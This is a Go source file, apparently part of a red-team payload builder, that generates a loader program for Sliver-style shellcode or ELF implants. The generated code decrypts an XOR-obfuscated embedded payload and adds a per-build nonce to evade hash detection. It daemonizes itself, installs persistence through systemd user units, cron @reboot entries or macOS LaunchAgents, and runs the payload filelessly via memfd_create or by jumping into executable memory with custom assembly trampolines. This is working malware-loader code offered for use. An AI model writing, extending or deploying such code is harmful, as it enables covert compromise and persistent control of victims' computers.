package loader

import "strconv"

func xorInPlace(buf, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= key[i%len(key)]
	}
}

func xorCopy(buf []byte, key string) []byte {
	out := append([]byte(nil), buf...)
	xorInPlace(out, []byte(key))
	return out
}

// combinedXORKey is the operator XOR key plus a per-build nonce so two
// compiles of the same payload never share a file hash.
func combinedXORKey(opts Options) string {
	if len(opts.Nonce) == 0 {
		return opts.XORKey
	}
	return opts.XORKey + string(opts.Nonce)
}

func generateSource(opts Options) string {
	if opts.GOOS == "windows" {
		return windowsSource(opts)
	}
	return unixSource(opts)
}

func goMod() string {
	return "module payloadloader\n\ngo 1.22\n"
}

func linuxInterpreter(arch string) string {
	switch arch {
	case "amd64":
		return "/lib64/ld-linux-x86-64.so.2"
	case "386":
		return "/lib/ld-linux.so.2"
	case "arm64":
		return "/lib/ld-linux-aarch64.so.1"
	case "arm":
		return "/lib/ld-linux-armhf.so.3"
	default:
		return ""
	}
}

// memfdNR is SYS_memfd_create for Linux. 0 on other GOOS (no memfd).
func memfdNR(goos, arch string) int {
	if goos != "linux" {
		return 0
	}
	switch arch {
	case "amd64":
		return 319
	case "arm64":
		return 279
	case "386":
		return 356
	case "arm":
		return 385
	default:
		return 0
	}
}

func unixSysnums(goos, arch string) (fork, clone, exitGroup int) {
	if goos != "linux" {
		return 0, 0, 0
	}
	switch arch {
	case "amd64":
		return 57, 56, 231
	case "arm64":
		return 0, 220, 94
	case "386":
		return 2, 120, 252
	case "arm":
		return 2, 120, 248
	default:
		return 0, 0, 0
	}
}

// jumpAsm is per-OS/arch CALL trampolines that switch to a dedicated stack.
// Go 1.21+ func values are pointers to funcval, so overlaying func() on a
// code address jumps into the payload bytes instead of to them. The goroutine
// stack is also too small for malasada/Sliver PIC.
func jumpAsm() map[string]string {
	return map[string]string{
		"jump_linux_amd64.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-16
	MOVQ code+0(FP), AX
	MOVQ stack+8(FP), BX
	MOVQ BX, SP
	ANDQ $0xfffffffffffffff0, SP
	CALL AX
	MOVQ $231, AX
	XORQ DI, DI
	SYSCALL
	JMP 0(PC)
`,
		"jump_linux_386.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-8
	MOVL code+0(FP), AX
	MOVL stack+4(FP), BX
	MOVL BX, SP
	ANDL $0xfffffff0, SP
	CALL AX
	MOVL $252, AX
	XORL BX, BX
	INT $0x80
	JMP 0(PC)
`,
		"jump_linux_arm64.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-16
	MOVD code+0(FP), R0
	MOVD stack+8(FP), R1
	MOVD R1, RSP
	CALL R0
	MOVD $94, R8
	MOVD $0, R0
	SVC $0
	B 0(PC)
`,
		"jump_linux_arm.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-8
	MOVW code+0(FP), R0
	MOVW stack+4(FP), R1
	MOVW R1, R13
	B (R0)
`,
		"jump_darwin_amd64.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-16
	MOVQ code+0(FP), AX
	MOVQ stack+8(FP), BX
	MOVQ BX, SP
	ANDQ $0xfffffffffffffff0, SP
	CALL AX
	MOVQ $1, AX
	XORQ DI, DI
	SYSCALL
	JMP 0(PC)
`,
		"jump_darwin_arm64.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-16
	MOVD code+0(FP), R0
	MOVD stack+8(FP), R1
	MOVD R1, RSP
	CALL R0
	MOVD $1, R16
	MOVD $0, R0
	SVC $0x80
	B 0(PC)
`,
		"jump_windows_amd64.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-16
	MOVQ code+0(FP), AX
	MOVQ stack+8(FP), BX
	PUSHQ R12
	MOVQ SP, R12
	MOVQ BX, SP
	ANDQ $0xfffffffffffffff0, SP
	SUBQ $40, SP
	CALL AX
	MOVQ R12, SP
	POPQ R12
	RET
`,
		"jump_windows_386.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-8
	MOVL code+0(FP), AX
	MOVL stack+4(FP), BX
	PUSHL SI
	MOVL SP, SI
	MOVL BX, SP
	ANDL $0xfffffff0, SP
	CALL AX
	MOVL SI, SP
	POPL SI
	RET
`,
		"jump_windows_arm64.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-16
	MOVD code+0(FP), R0
	MOVD stack+8(FP), R1
	MOVD RSP, R19
	MOVD R1, RSP
	CALL R0
	MOVD R19, RSP
	RET
`,
		"jump_windows_arm.s": `#include "textflag.h"

// func jump(code, stack uintptr)
TEXT ·jump(SB),NOSPLIT,$0-8
	MOVW code+0(FP), R0
	MOVW stack+4(FP), R1
	MOVW R1, R13
	B (R0)
`,
	}
}

func unixSource(opts Options) string {
	forkNR, cloneNR, exitNR := unixSysnums(opts.GOOS, opts.GOARCH)
	return `package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strings"
	"syscall"
	"unsafe"
)

func jump(code, stack uintptr)

//go:embed payload.bin
var payload []byte

//go:embed n.bin
var noise []byte

var xorKey = []byte(` + strconv.Quote(combinedXORKey(opts)) + `)

const (
	persistMethod  = ` + strconv.Quote(opts.Persistence) + `
	persistName    = ` + strconv.Quote(opts.PersistName) + `
	hideConsole    = ` + strconv.FormatBool(opts.HideConsole) + `
	ldLinux        = ` + strconv.Quote(linuxInterpreter(opts.GOARCH)) + `
	sysMemfdCreate = ` + strconv.Itoa(memfdNR(opts.GOOS, opts.GOARCH)) + `
	sysFork        = ` + strconv.Itoa(forkNR) + `
	sysClone       = ` + strconv.Itoa(cloneNR) + `
	sysExitGroup   = ` + strconv.Itoa(exitNR) + `
)

func xor(buf, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= key[i%len(key)]
	}
}

func daemonize() {
	if !hideConsole {
		return
	}
	if os.Getenv("SLIV_BG") == "1" {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exe)
	cmd.Args = os.Args
	cmd.Env = append(os.Environ(), "SLIV_BG=1")
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	if err := cmd.Start(); err != nil {
		return
	}
	os.Exit(0)
}

func persist() {
	if persistMethod == "" || persistMethod == "off" {
		return
	}
	self, err := os.Executable()
	if err != nil || self == "" {
		return
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return
	}
	if persistMethod == "systemd_user" || persistMethod == "all" {
		dir := filepath.Join(home, ".config", "systemd", "user")
		_ = os.MkdirAll(dir, 0o755)
		unit := filepath.Join(dir, persistName+".service")
		body := "[Unit]\nDescription=" + persistName + "\n[Service]\nExecStart=" + self + "\nRestart=on-failure\n[Install]\nWantedBy=default.target\n"
		if os.WriteFile(unit, []byte(body), 0o644) == nil {
			_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
			_ = exec.Command("systemctl", "--user", "enable", persistName+".service").Run()
		}
	}
	if persistMethod == "cron" || persistMethod == "all" {
		line := "@reboot " + self + "\n"
		out, err := exec.Command("crontab", "-l").Output()
		if err != nil {
			out = nil
		}
		if !strings.Contains(string(out), self) {
			cmd := exec.Command("crontab", "-")
			cmd.Stdin = bytes.NewReader(append(out, []byte(line)...))
			_ = cmd.Run()
		}
	}
	if persistMethod == "launchagent" {
		dir := filepath.Join(home, "Library", "LaunchAgents")
		_ = os.MkdirAll(dir, 0o755)
		plist := filepath.Join(dir, persistName+".plist")
		body := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
			"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
			"<plist version=\"1.0\"><dict>" +
			"<key>Label</key><string>" + persistName + "</string>" +
			"<key>ProgramArguments</key><array><string>" + self + "</string></array>" +
			"<key>RunAtLoad</key><true/>" +
			"<key>KeepAlive</key><false/>" +
			"</dict></plist>"
		_ = os.WriteFile(plist, []byte(body), 0o644)
	}
}

func isELF(b []byte) bool {
	return len(b) >= 4 && b[0] == 0x7f && b[1] == 'E' && b[2] == 'L' && b[3] == 'F'
}

func elfType(b []byte) uint16 {
	if len(b) < 18 {
		return 0
	}
	return uint16(b[16]) | uint16(b[17])<<8
}

func execPath(path string, buf []byte) {
	if elfType(buf) == 3 && ldLinux != "" {
		if _, err := os.Stat(ldLinux); err == nil {
			_ = syscall.Exec(ldLinux, []string{ldLinux, path}, os.Environ())
		}
	}
	_ = syscall.Exec(path, []string{persistName}, os.Environ())
}

func runMemfd(buf []byte) bool {
	if runtime.GOOS != "linux" || sysMemfdCreate == 0 {
		return false
	}
	name, err := syscall.BytePtrFromString("")
	if err != nil {
		return false
	}
	fd, _, errno := syscall.Syscall(uintptr(sysMemfdCreate), uintptr(unsafe.Pointer(name)), 0, 0)
	if errno != 0 {
		return false
	}
	n, err := syscall.Write(int(fd), buf)
	if err != nil || n != len(buf) {
		syscall.Close(int(fd))
		return false
	}
	path := fmt.Sprintf("/proc/self/fd/%d", fd)
	execPath(path, buf)
	syscall.Close(int(fd))
	return false
}

func runTempELF(buf []byte) {
	f, err := os.CreateTemp("", persistName+"-")
	if err != nil {
		return
	}
	path := f.Name()
	_, werr := f.Write(buf)
	_ = f.Close()
	if werr != nil {
		os.Remove(path)
		return
	}
	if os.Chmod(path, 0o755) != nil {
		os.Remove(path)
		return
	}
	execPath(path, buf)
	os.Remove(path)
}

func runELF(buf []byte) {
	if runMemfd(buf) {
		return
	}
	runTempELF(buf)
}

func runShellcode(buf []byte) {
	if len(buf) == 0 {
		return
	}
	page := syscall.Getpagesize()
	size := (len(buf) + page - 1) &^ (page - 1)
	mem, err := syscall.Mmap(-1, 0, size, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_ANON|syscall.MAP_PRIVATE)
	if err != nil {
		return
	}
	copy(mem, buf)
	rwx := syscall.PROT_READ | syscall.PROT_WRITE | syscall.PROT_EXEC
	if err := syscall.Mprotect(mem, rwx); err != nil {
		if err := syscall.Mprotect(mem, syscall.PROT_READ|syscall.PROT_EXEC); err != nil {
			return
		}
	}
	const stackSize = 8 << 20
	stack, err := syscall.Mmap(-1, 0, stackSize, syscall.PROT_READ|syscall.PROT_WRITE, syscall.MAP_ANON|syscall.MAP_PRIVATE)
	if err != nil {
		return
	}
	stk := uintptr(unsafe.Pointer(&stack[len(stack)-256]))
	stk &^= 15
	entry := uintptr(unsafe.Pointer(&mem[0]))
	runtime.LockOSThread()
	debug.SetGCPercent(-1)

	var pid uintptr
	var errno syscall.Errno
	if sysFork != 0 {
		pid, _, errno = syscall.RawSyscall(uintptr(sysFork), 0, 0, 0)
	} else if sysClone != 0 {
		pid, _, errno = syscall.RawSyscall(uintptr(sysClone), 17, 0, 0)
	}
	if errno == 0 && pid == 0 {
		jump(entry, stk)
		if sysExitGroup != 0 {
			syscall.RawSyscall(uintptr(sysExitGroup), 0, 0, 0)
		}
		for {
		}
	}
	if errno == 0 && pid > 0 {
		var st syscall.WaitStatus
		_, _ = syscall.Wait4(int(pid), &st, 0, nil)
		os.Exit(st.ExitStatus())
	}
	jump(entry, stk)
	runtime.KeepAlive(mem)
	runtime.KeepAlive(stack)
}

func run(buf []byte) {
	if isELF(buf) {
		runELF(buf)
		return
	}
	runShellcode(buf)
}

func main() {
	daemonize()
	persist()
	if len(payload) == 0 {
		return
	}
	buf := append([]byte(nil), payload...)
	xor(buf, xorKey)
	run(buf)
	runtime.KeepAlive(noise)
}
`
}
